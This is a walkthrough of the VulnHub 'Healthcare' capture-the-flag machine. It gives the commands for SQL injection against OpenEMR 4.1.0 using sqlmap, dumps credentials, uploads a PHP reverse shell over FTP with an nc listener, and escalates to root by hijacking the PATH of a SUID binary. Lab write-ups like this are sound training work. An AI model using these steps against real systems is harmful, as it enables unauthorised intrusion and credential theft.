# Healthcare — VulnHub

**CTF:** VulnHub  
**Date:** 2025-11-10  
**Category:** misc  
**Difficulty:** Grade 2  

---

## Summary

Healthcare is an intermediate OSCP-style machine by v1n1v131r4. The path involves discovering a hidden OpenEMR install, exploiting a blind SQL injection to dump credentials, FTP access with reused creds to upload a reverse shell, and a SUID binary PATH hijack to root.

---

## Reconnaissance

```bash
nmap -sC -sV -p- 192.168.1.x
```

Open ports:

```
21/tcp  open  ftp     ProFTPD 1.3.3d
80/tcp  open  http    Apache 2.2.17 (PCLinuxOS)
```

`robots.txt` disallowed several directories including `/admin/`.

---

## Enumeration

### Web — Finding OpenEMR

Initial `gobuster` runs with common wordlists returned nothing useful. Switched to a larger wordlist:

```bash
gobuster dir -u http://192.168.1.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
```

Found `/openemr` — an **OpenEMR 4.1.0** installation login page.

### SQL Injection

Tested the login endpoint manually by adding a single quote to the `u` parameter:

```
http://192.168.1.x/openemr/interface/login/validateUser.php?u='
```

The server returned an SQL error — **confirmed SQL injection**.

Used `sqlmap` to dump the database:

```bash
sqlmap -u "http://192.168.1.x/openemr/interface/login/validateUser.php?u=" \
  -D openemr -T users --dump --batch
```

Got two credential pairs:
- `admin:ackbar`
- `medical:medical`

---

## Exploitation — FTP Upload + Reverse Shell

Tried the `medical` credentials on FTP:

```bash
ftp 192.168.1.x
# User: medical / Pass: medical
```

Login successful. The FTP root mapped to `/var/www/html/openemr`. Uploaded a PHP reverse shell:

```bash
put php-reverse-shell.php
```

Set up a listener:

```bash
nc -lvnp 4444
```

Triggered the shell by browsing to:

```
http://192.168.1.x/openemr/php-reverse-shell.php
```

Got a shell as `apache`/`www-data`.

Alternatively: logged into OpenEMR as `admin:ackbar` → Administration → Files → edited `config.php` with the reverse shell content, then reloaded the page.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su medical
# password: medical
```

---

## Privilege Escalation — SUID Binary + PATH Hijacking

Searched for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found `/usr/bin/healthcheck` — non-standard binary. Ran `strings` on it:

```bash
strings /usr/bin/healthcheck
```

The binary called `fdisk` and `ifconfig` **without absolute paths**. Crafted a malicious `fdisk`:

```bash
cd /tmp
echo "/bin/bash" > fdisk
chmod 777 fdisk
export PATH=/tmp:$PATH
/usr/bin/healthcheck
```

Got a root shell.

```bash
cat /root/proof.txt
# YOU TRY HARDER
```

---

## Flags

- **User flag** — `/home/almirant/user.txt`
- **Root flag** — `/root/proof.txt`
